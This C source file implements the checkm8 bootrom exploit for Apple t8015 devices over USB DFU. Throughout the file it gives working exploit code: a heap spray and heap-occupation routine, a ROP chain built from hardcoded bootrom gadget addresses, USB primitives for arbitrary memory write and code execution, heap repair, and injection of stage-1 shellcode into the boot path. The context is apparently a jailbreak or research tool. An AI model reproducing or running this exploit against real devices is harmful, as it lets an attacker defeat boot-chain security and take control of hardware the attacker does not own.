#include <io/iousb.h>
#include <common/common.h>
#include <common/log.h>

// #define PATCH_ROM 1

#define MAX_RETRY_STALL (10000)

static unsigned char blank[DFU_MAX_TRANSFER_SZ];

#define checkm8_payload_size (0x1000)
static unsigned char checkm8_payload[checkm8_payload_size];
uint64_t overwriteBuf[16];

// rop chain
#include "asm/checkm8_arm64.h"      // checkm8_arm64_bin, checkm8_arm64_bin_len
#include "asm/usb_0xA1_2_arm64.h"   // usb_0xA1_2_arm64_bin, usb_0xA1_2_arm64_bin_len

#ifdef PATCH_ROM
#include "asm/patch_rom.h"          // patch_rom_bin, patch_rom_bin_len
#endif /* PATCH_ROM */

#define ARM_16K_TT_L2_SZ (0x2000000U)

#define ROP_START        (0x40)
#define MAX_BLOCK_SIZE   (0x50)
#define MAX_ROP_SIZE     (0x400)

#define DONE_MAGIC (0x646F6E65646F6E65ULL)
#define EXEC_MAGIC (0x6578656365786563ULL)
#define MEMC_MAGIC (0x6D656D636D656D63ULL)
#define MEMS_MAGIC (0x6d656d736d656d73ULL)

typedef struct callback_t{
    uint64_t arg0;
    uint64_t arg1;
    struct callback_t *next;
} callback_t;

static unsigned char rop_cb[MAX_ROP_SIZE];
static size_t callback_size=0;
static callback_t *callback;

static void cb_init(void)
{
    if(callback)
    {
        callback_t *cb;
        while(callback->next != NULL)
        {
            cb = callback->next;
            free(callback);
            callback = cb;
        }
        callback = NULL;
    }
    if(!callback)
    {
        callback = malloc(sizeof(callback_t));
        callback->next = NULL;
    }
}

static void rop_callback(uint64_t arg0, uint64_t arg1)
{
    callback_t *cb = callback;
    while(1)
    {
        if(cb->next == NULL)
        {
            cb->arg0 = arg0;
            cb->arg1 = arg1;
            cb->next = malloc(sizeof(callback_t));
            cb->next->next = NULL;
            return;
        }
        cb = cb->next;
    };
}

static int make_rop_callbacks(unsigned char* buf, uint64_t func_gadget, uint64_t address)
{
    callback_t *cb = callback;
    unsigned char block1[MAX_BLOCK_SIZE];
    unsigned char block2[MAX_BLOCK_SIZE];
    size_t block1_len = 0;
    size_t block2_len = 0;
    
    unsigned char data[MAX_BLOCK_SIZE*2];
    size_t len = 0;
    
    int count = 0;
    while(cb->next != NULL)
    {
        count++;
        cb = cb->next;
    };
    cb = callback;
    
    for(int i=0;i<count;i+=5)
    {
        memset(&data,   '\0', MAX_BLOCK_SIZE*2);
        memset(&block1, '\0', MAX_BLOCK_SIZE);
        memset(&block2, '\0', MAX_BLOCK_SIZE);
        block1_len = 0;
        block2_len = 0;
        
        for(int j=0;j<5;j++)
        {
            address += 0x10;
            if(j==4)
                address += 0x50;
            if((i+j) < (count-1))
            {
                if(cb->next == NULL)
                    return -1;
                *(uint64_t*)(block1+block1_len) = func_gadget;  block1_len+=8;
                *(uint64_t*)(block1+block1_len) = address;      block1_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg1;     block2_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg0;     block2_len+=8;
                cb = cb->next;
            }
            else if ((i+j) == (count-1))
            {
                if(cb->next == NULL)
                    return -1;
                *(uint64_t*)(block1+block1_len) = func_gadget;  block1_len+=8;
                *(uint64_t*)(block1+block1_len) = 0;            block1_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg1;     block2_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg0;     block2_len+=8;
                cb = cb->next;
            }
            else
            {
                *(uint64_t*)(block1+block1_len) = 0; block1_len+=8;
                *(uint64_t*)(block1+block1_len) = 0; block1_len+=8;
            }
        }
        
        if(block1_len > MAX_BLOCK_SIZE ||
           block2_len > MAX_BLOCK_SIZE)
            return -1;
        memcpy(data, block1, block1_len);
        memcpy(data+block1_len, block2, block2_len);
        
        if(len+block1_len+block2_len > MAX_ROP_SIZE)
            return -1;
        memcpy(buf+len, data, block1_len+block2_len);
        len += (block1_len+block2_len);
    }
    
    callback_size = len;
    return 0;
}

static void payload_init(void)
{
    // bzero
    memset(&checkm8_payload, '\0', checkm8_payload_size);
    
    memset(&rop_cb, '\0', MAX_ROP_SIZE);
    
    cb_init();
    
    uint64_t gUSBDescriptors                = 0x180008528;
    uint64_t gUSBSerialNumber               = 0x180003A78;
    uint64_t usb_create_string_descriptor   = 0x10000AE80;
    uint64_t gUSBSRNMStringDescriptor       = 0x1800008FA;
    uint64_t PAYLOAD_DEST                   = 0x18001BC00;
    uint64_t PAYLOAD_OFFSET                 = checkm8_arm64_bin_len;
    uint64_t PAYLOAD_SIZE                   = usb_0xA1_2_arm64_bin_len;
    uint64_t PAYLOAD_PTR                    = 0x180008638;
    
    uint64_t handle_interface_request       = 0x10000BCCC;
    
    uint64_t LOAD_ADDRESS                   = 0x18001C000;
    uint64_t USB_CORE_DO_IO                 = 0x10000B9A8;
    uint64_t func_gadget                    = 0x10000A9AC;
    uint64_t nop_gadget                     = 0x10000A9C4;
    uint64_t load_write_gadget              = 0x10000945C;
    uint64_t write_sctlr_gadget             = 0x1000003EC;
    uint64_t write_ttbr0                    = 0x10000045C;
    uint64_t tlbi                           = 0x1000004AC;
    uint64_t dc_civac                       = 0x1000004D0;
    uint64_t dmb                            = 0x1000004F0;
    uint64_t ttbr0_addr                     = 0x18000C000;
    uint64_t custom_ttbr0_addr              = 0x180020000;
    
    uint32_t checkm8_payload_off            = 0x800;
    uint32_t checkm8_off                    = 0x108;
    uint32_t usb_0xA1_2_off                 = 0x1f0;
#ifdef PATCH_ROM
    uint32_t patch_rom_off                  = 0x10;
#endif /* PATCH_ROM */
    
    uint32_t write_reg_off                  = 0x0;
    uint32_t ttbr0_vrom_off                 = 0x400;
    uint32_t ttbr0_sram_off                 = 0x600;
    
    // dfu_callback
    {
        memset(&overwriteBuf, '\x00', sizeof(overwriteBuf));
        overwriteBuf[4]  = nop_gadget;
        overwriteBuf[5]  = LOAD_ADDRESS + ROP_START;
        overwriteBuf[12] = nop_gadget;
        overwriteBuf[13] = LOAD_ADDRESS + ROP_START;
        overwriteBuf[14] = 0x0000000000000000;
        overwriteBuf[15] = 0xbeefbeef00000000;
    }
    
    // write_gadget
    // *(reg[0] + 8) = reg[1];
    {
        // 0x00
        uint64_t* reg = (uint64_t*)(checkm8_payload + write_reg_off + 0x00);
        reg[0] = custom_ttbr0_addr + ttbr0_vrom_off - 8;
        reg[1] = 0x1000006A5;
        
        // 0x10
        reg = (uint64_t*)(checkm8_payload + write_reg_off + 0x10);
        reg[0] = custom_ttbr0_addr + ttbr0_sram_off - 8;
        reg[1] = 0x180000625;
        
        // 0x20
        reg = (uint64_t*)(checkm8_payload + write_reg_off + 0x20);
        reg[0] = ttbr0_addr + ttbr0_sram_off - 8;
        reg[1] = 0x180000625;
        
#ifdef PATCH_ROM
        // 0x30
        reg = (uint64_t*)(checkm8_payload + write_reg_off + 0x30);
        reg[0] = ttbr0_addr + (ttbr0_vrom_off + 8) - 8;
        reg[1] = 0x60000100000625;
#endif /* PATCH_ROM */
        
    }
    
    // rop
    {
        uint64_t exec_payload = LOAD_ADDRESS + checkm8_payload_off;
        uint64_t write_reg = LOAD_ADDRESS + write_reg_off;
#ifdef PATCH_ROM
        uint64_t patchROM_payload = LOAD_ADDRESS + checkm8_payload_off + checkm8_arm64_bin_len + usb_0xA1_2_arm64_bin_len;
#endif /* PATCH_ROM */
        
        rop_callback(dc_civac,              exec_payload + 0x00);
        rop_callback(dc_civac,              exec_payload + 0x40);
        rop_callback(dc_civac,              exec_payload + 0x80);
        rop_callback(dmb,                   0);
        rop_callback(write_sctlr_gadget,    0x100D);
        rop_callback(load_write_gadget,     write_reg + 0x00);
        rop_callback(load_write_gadget,     write_reg + 0x10);
        rop_callback(write_ttbr0,           custom_ttbr0_addr);
        rop_callback(tlbi,                  0);
        rop_callback(load_write_gadget,     write_reg + 0x20);
#ifdef PATCH_ROM
        rop_callback(load_write_gadget,     write_reg + 0x30);
#endif /* PATCH_ROM */
        rop_callback(write_ttbr0,           ttbr0_addr);
        rop_callback(tlbi,                  0);
#ifdef PATCH_ROM
        rop_callback(patchROM_payload,      0);
#endif /* PATCH_ROM */
        rop_callback(exec_payload,          0);
        
        make_rop_callbacks(rop_cb, func_gadget, LOAD_ADDRESS + ROP_START);
        
        memcpy(checkm8_payload + ROP_START + 0x20, rop_cb, callback_size);
    }
    
    // checkm8_arm64 payload
    memcpy(checkm8_payload + checkm8_payload_off,
           checkm8_arm64_bin,
           checkm8_arm64_bin_len);
    
    // usb_0xA1_2_arm64 payload
    memcpy(checkm8_payload + checkm8_payload_off + checkm8_arm64_bin_len,
           usb_0xA1_2_arm64_bin,
           usb_0xA1_2_arm64_bin_len);
    
#ifdef PATCH_ROM
    // patchROM payload
    memcpy(checkm8_payload + checkm8_payload_off + checkm8_arm64_bin_len + usb_0xA1_2_arm64_bin_len,
           patch_rom_bin,
           patch_rom_bin_len);
#endif /* PATCH_ROM */
    
    // offsets
    uint64_t* pbase = (uint64_t*)(checkm8_payload + checkm8_payload_off + checkm8_off);
    pbase[0] = gUSBDescriptors;
    pbase[1] = gUSBSerialNumber;
    pbase[2] = usb_create_string_descriptor;
    pbase[3] = gUSBSRNMStringDescriptor;
    pbase[4] = PAYLOAD_DEST;
    pbase[5] = PAYLOAD_OFFSET;
    pbase[6] = PAYLOAD_SIZE;
    pbase[7] = PAYLOAD_PTR;
    
    pbase = (uint64_t*)(checkm8_payload + checkm8_payload_off + checkm8_arm64_bin_len + usb_0xA1_2_off);
    pbase[0] = handle_interface_request;
    pbase[1] = LOAD_ADDRESS;
    pbase[2] = EXEC_MAGIC;
    pbase[3] = DONE_MAGIC;
    pbase[4] = MEMC_MAGIC;
    pbase[5] = MEMS_MAGIC;
    pbase[6] = USB_CORE_DO_IO;
    
#ifdef PATCH_ROM
    pbase = (uint64_t*)(checkm8_payload + checkm8_payload_off + checkm8_arm64_bin_len + usb_0xA1_2_arm64_bin_len + patch_rom_off);
    pbase[0] = 0xD2800000;
    pbase[1] = 0x10000624C + ARM_16K_TT_L2_SZ;
#endif /* PATCH_ROM */
}


static unsigned int val = 0;

// checkm8 usb req
__unused static transfer_t usb_req_stall(io_client_t client)
{
    return usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
}

__unused static transfer_t usb_req_leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ, 1);
}

__unused static transfer_t usb_req_no_leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, EP0_MAX_PACKET_SZ + 1, 1);
}

__unused static transfer_t leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, 1);
}

__unused static transfer_t no_leak(io_client_t client, unsigned char* blank)
{
    return usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, (3 * EP0_MAX_PACKET_SZ) + 1, 1);
}

__unused static transfer_t usb_req_leak_with_async(io_client_t client,
                                                   unsigned char* blank,
                                                   int usleep_time,
                                                   async_transfer_t transfer)
{
    transfer_t result = async_usb_ctrl_transfer(client, 0x80, 6, 0x304, 0x40a, blank, EP0_MAX_PACKET_SZ, &transfer);
    usleep(usleep_time);
    io_abort_pipe_zero(client);
    usleep(usleep_time);
    while(transfer.ret != kIOReturnAborted)
        CFRunLoopRun();
    
    return result;
}

static void pre_retry(io_client_t client, unsigned int i)
{
    transfer_t result;
    memset(&blank, '\x41', EP0_MAX_PACKET_SZ);
    
    DEBUGLOG("(*) retry: %x", i);
    usleep(10000);
    result = send_data(client, blank, EP0_MAX_PACKET_SZ); // send blank data and redo the request.
    DEBUGLOG("(*) %x", result.ret);
    usleep(10000);
}

static int heap_spray_t8015(io_client_t client)
{
    unsigned int i = 0;
    transfer_t result;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    result = send_data(client, blank, DFU_MAX_TRANSFER_SZ);
    DEBUGLOG("(1/5) %x", result.ret);
    
    i = 0;
    while(1)
    {
        async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 3 * EP0_MAX_PACKET_SZ, i);
        
        result = usb_req_leak(client, blank);
        if(result.ret != kIOReturnSuccess)
            break;
        
        i++;
        DEBUGLOG("(*) retry: %x", i);
        
        if(i > MAX_RETRY_STALL)
        {
            ERROR("Failed to stall");
            return -1;
        }
    }
    DEBUGLOG("(2/5) %x, %d", result.ret, i);
    
    for(i=0; i<6; i++)
    {
        result = no_leak(client, blank);
    }
    DEBUGLOG("(3/5) %x", result.ret);
    
    result = usb_req_leak(client, blank);
    DEBUGLOG("(4/5) %x", result.ret);
    
    result = no_leak(client, blank);
    DEBUGLOG("(5/5) %x", result.ret);
    
    return 0;
}

static int set_global_state_t8015(io_client_t client)
{
    transfer_t result;
    UInt32 sent = 0;
    unsigned int i = 0;
    
    
    // A11
    unsigned int value = 0x500;
    
    
    memset(&blank, '\x41', DFU_MAX_TRANSFER_SZ);
    
    i = 0;
    {
        /*
         while(((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0)) >= val) || (sent == 0))
         {
         // check return value is stall or not
         // thanks @0x7ff https://github.com/0x7ff/gaster/blob/7ffffff4b43171f3c862258cb28f57a789a59b8a/gaster.c#L1130
         result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, NULL, 0, 100);
         DEBUGLOG("(0/2) %x", result.ret);
         
         if(result.ret == kIOUSBPipeStalled || result.ret == kUSBHostReturnPipeStalled)
         break;
         
         if(i > 10000)
         return -1;
         i++;
         pre_retry(client, i);
         }
         val += 0x40;
         val -= sent;
         */
        
        while(i < 10000)
        {
            sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0);
            if(sent >= value)
                goto retry;
            
            val = value;
            val += 0x40;
            val -= sent;
            
            DEBUGLOG("(1/3) sent: %x, val: %x", (unsigned int)sent, val);
            
            //result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, NULL, 0, 100);
            result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
            DEBUGLOG("(2/3) %x", result.ret);
            
            if(result.ret == kIOUSBPipeStalled || result.ret == kUSBHostReturnPipeStalled)
                break;
            
        retry:
            // retry
            if(i > 10000)
                return -1;
            i++;
            pre_retry(client, i);
        }
    }
    
    result = send_abort(client);
    DEBUGLOG("(3/3) %x", result.ret);
    
    return 0;
}

static int heap_occupation_t8015(io_client_t client)
{
    transfer_t result;
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    {
        result = usb_req_stall(client);
        DEBUGLOG("(1/4) %x", result.ret);
        usleep(10000);
        
        for(int i=0; i<1; i++)
        {
            result = usb_req_leak(client, blank);
        }
        DEBUGLOG("(2/4) %x", result.ret);
        usleep(10000);
        
        if(val > DFU_MAX_TRANSFER_SZ - sizeof(overwriteBuf))
            return -1;
        
        //int overwrite_push = val;
        int overwrite_push = 0;
        memset(&blank, '\x00', DFU_MAX_TRANSFER_SZ);
        memcpy(blank + overwrite_push, overwriteBuf, sizeof(overwriteBuf));
        overwrite_push += sizeof(overwriteBuf);
        
        
        result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, overwrite_push, 100);
        DEBUGLOG("(3/4) %x, %x", result.ret, overwrite_push);
        
        {
            size_t len = 0;
            size_t size = 0;
            while(len < checkm8_payload_size) {
                size = ((checkm8_payload_size - len) > DFU_MAX_TRANSFER_SZ) ? DFU_MAX_TRANSFER_SZ : (checkm8_payload_size - len);
                result = send_data_with_time(client, (unsigned char*)&checkm8_payload[len], size, 100);
                len += size;
            }
        }
        DEBUGLOG("(4/4) %x", result.ret);
        usleep(1000);
        
    }
    
    return 0;
}

static int checkm8_write_memory(io_client_t *pclient,
                                uint64_t address, uint64_t size,
                                unsigned char * buf)
{
    if(!*pclient) // check client
    {
        ERROR("Failed to get response from client");
        return -1;
    }
    
    if(!buf)
    {
        ERROR("No buffer data");
        return -1;
    }
    
    if(size == 0)
    {
        ERROR("No buffer size");
        return -1;
    }
    
    if(size > (0x800 - (8*5)))
    {
        ERROR("Data size too large.");
        return -1;
    }
    
    transfer_t result;
    
    io_client_t _client = *pclient;
    static unsigned char data[DFU_MAX_TRANSFER_SZ];
    size_t req_size = 0;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    memset(&data, '\0', DFU_MAX_TRANSFER_SZ);
    
    uint64_t* payload = (uint64_t*)data;
    payload[0] = 0x6d656d636d656d63;
    payload[2] = address; // write addr
    payload[3] = 0x18001C000 + 16 + (3 * 8); // // load_base + 16 + (index * 4)
    payload[4] = size;
    
    memcpy(data + (8*5), buf, size);
    
    req_size = (8*5) + size;
    
    if(req_size > 0x800)
    {
        ERROR("Data size too large.");
        return -1;
    }
    DEBUGLOG("req_size: %zx", req_size);
    
    DEBUGLOG("WRITE_MEMORY: %016llx (len: %llx)", address, size);
    
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, blank, 16, 100);
    DEBUGLOG("STAGE1 SETUP: (1/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, NULL,   0, 100);
    DEBUGLOG("STAGE1 SETUP: (2/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (3/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (4/4) %x", result.ret);
    
    result = send_data_with_time(_client, data, req_size, 100);
    DEBUGLOG("STAGE2 SEND: (1/1) %x", result.ret);
    
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 2, 0xffff, 0x0000, blank, 1, 100);
    DEBUGLOG("STAGE3 EXECUTE: (1/1) %x", result.ret);
    
    usleep(10000);
    if(io_reconnect(pclient, 5, DEVICE_DFU, USB_NO_RESET, false, 10000))
    {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    return 0;
}

static int checkm8_execute(io_client_t *pclient,
                           int res,
                           // TODO
                           uint64_t exec, uint64_t arg1)
{
    if(!*pclient) // check client
    {
        ERROR("Failed to get response from client");
        return -1;
    }
    
    transfer_t result;
    
    io_client_t _client = *pclient;
    static unsigned char data[DFU_MAX_TRANSFER_SZ];
    size_t req_size = 0;
    
    uint64_t* payload = (uint64_t*)data;
    payload[0] = 0x6578656365786563;
    req_size += sizeof(uint64_t);
    
    // exec
    payload[1] = exec;
    req_size += sizeof(uint64_t);
    
    // TODO
    if(arg1)
    {
        payload[2] = arg1;
        req_size += sizeof(uint64_t);
    }
    
    if(req_size > 0x800)
    {
        ERROR("Data size too large.");
        return -1;
    }
    DEBUGLOG("req_size: %zx", req_size);
    
    DEBUGLOG("EXECUTE: %016llx(0x%016llx)", exec, arg1);
    
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, blank, 16, 100);
    DEBUGLOG("STAGE1 SETUP: (1/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0x21, 1, 0x0000, 0x0000, NULL,   0, 100);
    DEBUGLOG("STAGE1 SETUP: (2/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (3/4) %x", result.ret);
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 3, 0x0000, 0x0000, blank,  6, 100);
    DEBUGLOG("STAGE1 SETUP: (4/4) %x", result.ret);
    
    result = send_data_with_time(_client, data, req_size, 100);
    DEBUGLOG("STAGE2 SEND: (1/1) %x", result.ret);
    
    result = usb_ctrl_transfer_with_time(_client, 0xa1, 2, 0xffff, 0x0000, blank, 16, 100);
    DEBUGLOG("STAGE3 EXECUTE: (1/1) %x", result.ret);
    
    if(res)
    {
        usleep(10000);
        if(io_reconnect(pclient, 5, DEVICE_DFU, USB_NO_RESET, false, 10000))
        {
            ERROR("Failed to reconnect to device");
            return -1;
        }
    }
    
    return 0;
}

int checkm8_t8015(io_client_t client, checkra1n_payload_t shellcode)
{
    
    payload_init();
    
    int STEP2_USB_RESET_FLAGS = USB_NO_RESET;
    int STEP3_USB_RESET_FLAGS = USB_NO_RESET;
    
    {
        // A9X-A11
        STEP2_USB_RESET_FLAGS |= (USB_REENUMERATE);
        STEP3_USB_RESET_FLAGS |= (USB_REENUMERATE);
    }
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    LOG_EXPLOIT_NAME("checkm8");
    
    // transfer test
    usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ);
    usleep(10000);
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client)
    {
        ERROR("Failed to reconnect to device");
        client = NULL;
        return -1;
    }
    
    {
        LOG("running heap_spray");
        if(heap_spray_t8015(client))
        {
            ERROR("Failed to execute heap_spray");
            return -1;
        }
        
        LOG("reconnecting");
        io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
        if(!client)
        {
            ERROR("Failed to reconnect to device");
            return -1;
        }
    }
    
    {
        LOG("running set_global_state()");
        usleep(10000);
        if(set_global_state_t8015(client))
        {
            ERROR("Failed to execute set_global_state");
            return -1;
        }
        
        LOG("reconnecting");
        io_reconnect(&client, 5, DEVICE_DFU, STEP2_USB_RESET_FLAGS, false, 10000);
        if(!client)
        {
            ERROR("Failed to reconnect to device");
            return -1;
        }
    }
    
    LOG("running heap_occupation()");
    usleep(10000);
    if(heap_occupation_t8015(client))
    {
        ERROR("Failed to execute heap_occupation");
        return -1;
    }
    
    LOG("reconnecting");
    io_reconnect(&client, 5, DEVICE_DFU, STEP3_USB_RESET_FLAGS, false, 10000);
    if(!client)
    {
        ERROR("Failed to reconnect to device");
        return -1;
    }
    
    LOG("checkmate!");
    
    {
        // t8015
        uint64_t HEAP_BASE         = 0x1801E8000;
        uint64_t HEAP_WRITE_OFFSET =      0x5000;
        uint64_t HEAP_WRITE_HASH   = 0x10000D4EC;
        uint64_t HEAP_CHECK_ALL    = 0x10000DB98;
        uint64_t HEAP_STATE        = 0x1800086A0;
        uint64_t NAND_BOOT_JUMP    = 0x10000188C;
        uint64_t BOOTSTRAP_TASK_LR = 0x180015F88;
        uint64_t DFU_BOOL          = 0x1800085B0;
        uint64_t DFU_NOTIFY        = 0x1000098B4;
        uint64_t DFU_STATE         = 0x1800085E0;
        uint64_t TRAMPOLINE        = 0x180018000;
        
        uint64_t block1[8];
        uint64_t block2[8];
        
        memset(&block1, '\0', sizeof(block1));
        block1[3] = HEAP_STATE;
        block1[4] =          2;
        block1[5] =        132;
        block1[6] =        128;
        block1[7] =          0;
        
        memset(&block2, '\0', sizeof(block2));
        block2[3] = HEAP_STATE;
        block2[4] =          2;
        block2[5] =          8;
        block2[6] =        128;
        block2[7] =          0;
        
#define WRITE_MEMORY(client, addr, size, buf) \
({ \
if(checkm8_write_memory(client, addr, size, buf)) \
{ \
ERROR("get error response"); \
return -1; \
} \
})
        
#define EXECUTE(client, bool, exec, arg1) \
({ \
if(checkm8_execute(client, bool, exec, arg1)) \
{ \
ERROR("get error response"); \
return -1; \
} \
})
        
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET,         sizeof(block1), (unsigned char *)block1);
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET +  0x80, sizeof(block2), (unsigned char *)block2);
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100, sizeof(block2), (unsigned char *)block2);
        WRITE_MEMORY(&client, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180, sizeof(block2), (unsigned char *)block2);
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET        );
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET +  0x80);
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100);
        EXECUTE(&client, 1, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180);
        EXECUTE(&client, 1, HEAP_CHECK_ALL,  0);
        LOG("Heap repaired");
        
        usleep(1000);
        
        uint32_t branch_insn[1];
        uint64_t ptr[1];
        uint8_t  boolp[1];
        
        // TODO: branch 'TRAMPOLINE' -> 'TRAMPOLINE + 0x400'
        branch_insn[0] = 0x14000100;
        ptr[0]         = NAND_BOOT_JUMP;
        boolp[0]       = 1;
        
        WRITE_MEMORY(&client, TRAMPOLINE,                            4, (unsigned char *)branch_insn);
        WRITE_MEMORY(&client, TRAMPOLINE + 0x400, shellcode.stage1_len, (unsigned char *)shellcode.stage1);
        WRITE_MEMORY(&client, BOOTSTRAP_TASK_LR,                     8, (unsigned char *)ptr);
        WRITE_MEMORY(&client, DFU_BOOL,                              1, (unsigned char *)boolp);
        EXECUTE(&client, 0, DFU_NOTIFY, DFU_STATE);
        
        LOG("Booted?");
    }
    
    return 0;
}
